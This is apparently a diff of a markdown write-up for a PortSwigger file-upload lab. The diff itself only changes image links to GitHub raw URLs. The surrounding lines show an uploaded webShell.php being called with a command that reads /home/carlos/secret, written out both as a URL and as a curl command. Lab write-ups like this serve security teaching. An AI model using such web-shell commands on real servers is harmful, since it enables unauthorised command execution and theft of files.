@@ -19,13 +19,13 @@ Now, If the application doesn’t do any validation on user’s file upload, an 
 
 When we clicked the `Upload` button, a POST request will be sent to `/my-account/avatar`, with parameters `name='user'`& `name='csrf'` at end after image data.
 
-![](./images/834dbbb7f038_001.png)
+![](https://raw.githubusercontent.com/ExploitResearch/PortSwigger-Labs/main/File_upload_vulnerabilities/images/834dbbb7f038_001.png)
 
 when we click “Back to My Account”, notice that image was fetched using a `GET` request to `/files/avatars/<YOUR-IMAGE>`. 
 
-![](./images/834dbbb7f038_002.png)
+![](https://raw.githubusercontent.com/ExploitResearch/PortSwigger-Labs/main/File_upload_vulnerabilities/images/834dbbb7f038_002.png)
 
-![](./images/834dbbb7f038_003.png)
+![](https://raw.githubusercontent.com/ExploitResearch/PortSwigger-Labs/main/File_upload_vulnerabilities/images/834dbbb7f038_003.png)
 
 Now we know **the exact location of the uploaded file: **`/files/avatars/test.png`**.**
 
@@ -51,7 +51,7 @@ Calling the file will output the content of the secret file:
 https://0a7b004f038d0eb58082174300b30087.web-security-academy.net/files/avatars/webShell.php/?cmd=cat%20/home/carlos/secret
 ```
 
-![](./images/834dbbb7f038_004.png)
+![](https://raw.githubusercontent.com/ExploitResearch/PortSwigger-Labs/main/File_upload_vulnerabilities/images/834dbbb7f038_004.png)
 
 via command line using curl
 
@@ -59,7 +59,7 @@ via command line using curl
 curl https://0a7b004f038d0eb58082174300b30087.web-security-academy.net/files/avatars/webShell.php --get --data-urlencode "cmd=cat /home/carlos/secret"
 ```
 
-![](./images/834dbbb7f038_005.png)
+![](https://raw.githubusercontent.com/ExploitResearch/PortSwigger-Labs/main/File_upload_vulnerabilities/images/834dbbb7f038_005.png)
 
 ## PortSwigger Lab
 
